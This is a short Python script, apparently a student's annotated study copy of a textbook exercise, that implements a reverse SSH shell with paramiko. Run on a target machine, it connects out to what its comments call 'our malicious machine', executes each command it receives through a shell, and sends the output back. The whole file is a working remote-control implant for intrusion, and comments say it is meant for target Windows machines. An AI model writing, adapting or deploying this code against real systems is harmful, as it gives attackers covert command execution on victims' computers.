import paramiko
import shlex
import subprocess

#Normally you would send commands from the SSH Client TO The SSH Server.
#But because most Windows systems don't include an SSH Server, 
#instead we will need to reverse this and Send Commands from the server TO the SSH CLient 
#The idea is we execute this on the 

def ssh_command(ip, port, user, passwd, command):

    client = paramiko.SSHClient() #Initiate client instance

    client.set_missing_host_key_policy(paramiko.AutoAddPolicy) #auto add server's key on first connection

    client.connect(ip, port=port, username=user, password=passwd) #connect to the server on specified ip, user, pass. The server will be out malicios machine.

    ssh_session = client.get_transport().open_session() #Creates the SSH Session, so that we can STAY connected to the server once establish connection.

    if ssh_session.active: #If the session has been successfully connected
        ssh_session.send(command) #Then send the command to the server (the server will be our device)
        print(ssh_session.recv(1024).decode()) #receive the response FROM the server and decode it so we can read it.

        while True:
            command = ssh_session.recv(1024) #sets variable to restore the responses from the Client  (Rember in this case we are sending commands FROM Sever to Client)
            try:
                cmd = command.decode() #Decode the command we recieved FROM the server.  The server is our malicious machine.
                if cmd == 'exit':   #if target machine has received the 'exit' command
                    client.close() #close the connection if the command we recive is exit
                    break
                
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True) #if command is not exit,   then it gets parsed corrrectly and executed in shell and the output is stored in the varaible cmd_output

                ssh_session.send(cmd_output or 'okay')  #The OUTPUT of the command gets sent to the server (our malicoius attacking device)  so we can see waht happened when teh command was executed


            except Exception as e:
                ssh_session.send(str(e)) #if error received, send it to back to our machine,  (the client in this sense)
                client.close() #close the connection

            
    return



if __name__ == '__main__': #if the script is executed directly
    import getpass
    user = getpass.getuser()
    password = getpass.getpass()
    ip = input('Enter serevr IP: ')
    port = int(input('Enter port: '))
    ssh_command(ip, port, user, password, 'ClientConnected')



#Because commands are being sent from SERVER to CLIENT
#This code is for an SSH Client. We run it on the target machine.


#THis is because most target windows machines will not have SSH Servers included on them. So it is easier to make our machie the 'SSH Server' and send commands that way.


#This code is actually for an SSH Client, so it will be exeucted on the target machine.



#Then once we connect to our malicous machine,   our malicous machine acts as a server.